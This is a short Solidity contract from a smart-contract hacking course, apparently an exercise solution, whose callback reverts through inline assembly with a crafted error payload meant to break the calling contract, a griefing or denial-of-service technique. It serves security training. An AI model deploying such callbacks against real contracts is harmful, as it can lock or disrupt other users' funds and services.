// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "../../interfaces/ICallbackContract.sol";
import "hardhat/console.sol";

contract AttackContractSolvedAdvanced {
    bool public allowExecution;

    function flipSwitch() public {
        allowExecution = !allowExecution;
    }

    function beforeExecution() external {
        if (allowExecution) return;

        assembly {
            let free_mem_ptr := mload(0x40)
            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(free_mem_ptr, 0x04), 28)
            mstore(add(free_mem_ptr, 0x40), 100000000000) // out of gas
            revert(free_mem_ptr, 0x120)
        }
    }
}
